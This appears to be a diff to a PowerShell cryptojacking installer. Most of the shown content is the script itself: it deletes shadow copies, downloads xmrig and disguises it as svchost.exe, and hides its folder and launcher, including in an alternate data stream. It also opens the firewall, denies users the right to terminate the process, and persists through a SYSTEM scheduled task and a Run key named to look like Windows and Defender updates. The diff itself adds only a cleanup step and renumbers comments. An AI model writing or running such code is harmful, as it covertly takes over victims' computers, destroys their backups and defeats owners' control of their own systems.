@@ -33,15 +33,20 @@ vssadmin delete shadows /all /quiet 2>$null
 if (-not (Test-Path $installPath)) { New-Item -ItemType Directory -Path $installPath -Force }
 Set-ItemProperty -Path $installPath -Name Attributes -Value "Hidden" -Force
 
-# 5. Download miner
+# 5. Remove existing extraction directory if it exists
+if (Test-Path $extractPath) {
+    Remove-Item -Path $extractPath -Recurse -Force -ErrorAction SilentlyContinue
+}
+
+# 6. Download miner
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 Invoke-WebRequest -Uri $minerUrl -OutFile $zipPath
 
-# 6. Extract archive
+# 7. Extract archive
 Add-Type -AssemblyName System.IO.Compression.FileSystem
 [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $extractPath)
 
-# 7. Obfuscate executable name (rename to svchost.exe) – only if source exists
+# 8. Obfuscate executable name (rename to svchost.exe) – only if source exists
 $sourceExe = "$extractPath\xmrig.exe"
 if (Test-Path $sourceExe) {
     Move-Item $sourceExe $obfuscatedExe -Force
@@ -50,7 +55,7 @@ if (Test-Path $sourceExe) {
     exit 1
 }
 
-# 8. Create config.json with CPU limiting (30% hint, yield, low priority)
+# 9. Create config.json with CPU limiting (30% hint, yield, low priority)
 $config = @"
 {
     "autosave": true,
@@ -60,14 +65,14 @@ $config = @"
 "@
 $config | Out-File -FilePath "$extractPath\config.json" -Encoding utf8
 
-# 9. Create launcher script (hidden)
+# 10. Create launcher script (hidden)
 $launcher = @"
 Start-Process -WindowStyle Hidden -FilePath "$obfuscatedExe" -ArgumentList "--config=$extractPath\config.json"
 "@
 $launcherPath = "$installPath\launcher.ps1"
 $launcher | Out-File -FilePath $launcherPath -Encoding ascii
 
-# 10. Alternate data stream for launcher (fallback) – skip if not supported
+# 11. Alternate data stream for launcher (fallback) – skip if not supported
 $adsPath = "$installPath\visible.txt"
 try {
     "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$launcherPath`"" | Out-File -FilePath $adsPath -Encoding ascii
@@ -76,32 +81,32 @@ try {
     # ADS not supported on some filesystems, ignore
 }
 
-# 11. Add firewall rule for miner
+# 12. Add firewall rule for miner
 New-NetFirewallRule -DisplayName "Windows Update Service" -Direction Outbound -Program $obfuscatedExe -Action Allow -Protocol TCP -LocalPort 5555 -ErrorAction SilentlyContinue
 Set-NetFirewallProfile -Profile Domain,Public,Private -NotifyOnListen False -ErrorAction SilentlyContinue
 
-# 12. Protect process with icacls (deny terminate to Users)
+# 13. Protect process with icacls (deny terminate to Users)
 icacls $obfuscatedExe /deny "Users:(WD,DE,DC)" 2>$null
 
-# 13. Scheduled task as SYSTEM (AtLogOn and AtStartup)
+# 14. Scheduled task as SYSTEM (AtLogOn and AtStartup)
 $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$launcherPath`""
 $trigger1 = New-ScheduledTaskTrigger -AtStartup
 $trigger2 = New-ScheduledTaskTrigger -AtLogOn -User "SYSTEM"
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
 Register-ScheduledTask -TaskName "WindowsUpdateService" -Action $action -Trigger $trigger1,$trigger2 -Settings $settings -User "SYSTEM" -RunLevel Highest -Force
 
-# 14. Registry run key (fallback persistence)
+# 15. Registry run key (fallback persistence)
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsDefenderUpdate" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$launcherPath`"" -Force
 
-# 15. Hide directory again (in case attributes were reset)
+# 16. Hide directory again (in case attributes were reset)
 Set-ItemProperty -Path $installPath -Name Attributes -Value "Hidden" -Force
 
-# 16. Start miner immediately
+# 17. Start miner immediately
 Start-Process -WindowStyle Hidden -FilePath $obfuscatedExe -ArgumentList "--config=$extractPath\config.json"
 
-# 17. Cleanup
+# 18. Cleanup
 Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
 Remove-Item $adsPath -Force -ErrorAction SilentlyContinue
 
-# 18. Print success message
+# 19. Print success message
 Write-Output "Ran successfully"
